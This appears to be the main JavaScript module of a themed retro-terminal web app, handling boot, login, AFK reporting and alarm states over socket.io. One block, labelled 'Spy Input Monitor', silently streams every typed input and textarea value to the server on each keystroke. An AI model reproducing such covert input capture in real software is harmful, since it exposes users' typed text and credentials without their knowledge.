import { UI, switchScreen, switchView, initDraggables } from './modules/ui.js';
import { handleLogin } from './modules/auth.js';
import { initAudio, playSound } from './modules/audio.js';
import { initNotepad } from './modules/notepad.js';
import { initHelp } from './modules/help.js';
import { initFiles } from './modules/files.js';
import { initComms } from './modules/comms.js';
import { initProtocols } from './modules/protocols.js';

// Carrega o script.js (Efeitos visuais e extras)
const scriptExtras = document.createElement('script');
scriptExtras.src = '../script.js'; 
document.body.appendChild(scriptExtras);

const socket = io();
let currentUser = null;
let idleTimer;
let currentView = 'IDLE';
const IDLE_LIMIT = 60000;

document.addEventListener("DOMContentLoaded", () => {
    initAudio();
    initNotepad(socket); // Agora seguro com a correção
    initHelp(socket);
    initFiles(socket);
    initProtocols(socket);
    initDraggables();

    setInterval(() => {
        const now = new Date();
        const clock = document.getElementById('clock');
        const dateDisplay = document.getElementById('dateDisplay');
        if (clock) clock.textContent = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        if (dateDisplay) {
            const year = now.getFullYear() + 16;
            dateDisplay.textContent = `${year}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}`;
        }
    }, 1000);

    // Boot Logic
    const bootScreen = document.getElementById('boot-sequence');
    if (bootScreen) {
        playSound('boot');
        setTimeout(() => {
            bootScreen.classList.add('hidden');
            switchScreen('login');
        }, 5000);
    }

    const btnLogin = document.getElementById('btnLogin');
    const inpId = document.getElementById('inpId');

    if (btnLogin) {
        btnLogin.onclick = async () => {
            currentUser = await handleLogin(socket);
            if(currentUser) initComms(socket, currentUser);
        };
    }
    
    if (inpId) {
        inpId.addEventListener("keydown", async e => { 
            if (e.key === "Enter") {
                currentUser = await handleLogin(socket);
                if(currentUser) initComms(socket, currentUser);
            }
        });
    }

    // Dashboard Button
    const btnDash = document.getElementById('btnMyDashboard');
    if (btnDash) {
        btnDash.onclick = () => {
            switchView('dashboard');
            currentView = 'DASHBOARD';
            playSound('click');
            reportActivity();
        };
    }

    // Spy Input Monitor
    document.addEventListener('input', (e) => {
        if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            socket.emit('live_input', {
                fieldId: e.target.id || 'unknown',
                value: e.target.value
            });
        }
    });

    // AFK System
    document.addEventListener('mousemove', resetIdleTimer);
    document.addEventListener('keydown', resetIdleTimer);

    function resetIdleTimer() {
        if (!currentUser) return;
        clearTimeout(idleTimer);
        reportActivity(false);
        idleTimer = setTimeout(() => {
            reportActivity(true);
        }, IDLE_LIMIT);
    }

    function reportActivity(isAfk = false) {
        if (!currentUser) return;
        const openWindows = [];
        document.querySelectorAll('.window-newton').forEach(win => {
            if (!win.classList.contains('hidden')) {
                openWindows.push({ id: win.id, hidden: false });
            }
        });
        socket.emit('update_activity', { 
            view: isAfk ? 'AFK' : currentView, 
            afk: isAfk,
            fullState: { view: currentView, afk: isAfk, windows: openWindows }
        });
    }

    socket.on('force_state_report', () => {
        reportActivity();
    });

    socket.on('status_update', (status) => {
        const ind = document.getElementById('statusIndicator');
        const txt = document.getElementById('statusText');
        if (txt) txt.textContent = status;
        if (ind) {
            ind.style.backgroundColor = status === 'ONLINE' ? '#4ade80' : '#9ca3af';
            ind.style.boxShadow = status === 'ONLINE' ? '0 0 5px #4ade80' : 'none';
        }
    });

    socket.on('alarm_update', (alarmType) => {
        document.body.className = '';
        const banner = document.getElementById('alarm-banner');
        const text = document.getElementById('alarm-type-text');
        const powerOff = document.getElementById('power-off-overlay');
        
        if (alarmType === 'off') {
            if (powerOff) powerOff.classList.remove('hidden');
            if (banner) banner.classList.add('hidden');
        } else if (alarmType === 'on') {
            document.body.style.opacity = '0';
            setTimeout(() => { document.body.style.opacity = '1'; playSound('boot'); }, 1000);
        } else if (alarmType !== 'green') {
            if (powerOff) powerOff.classList.add('hidden');
            document.body.classList.add(`alarm-${alarmType}`);
            if (banner) {
                banner.classList.remove('hidden');
                if (text) text.textContent = `${alarmType.toUpperCase()} ALERT`;
            }
        }
    });
});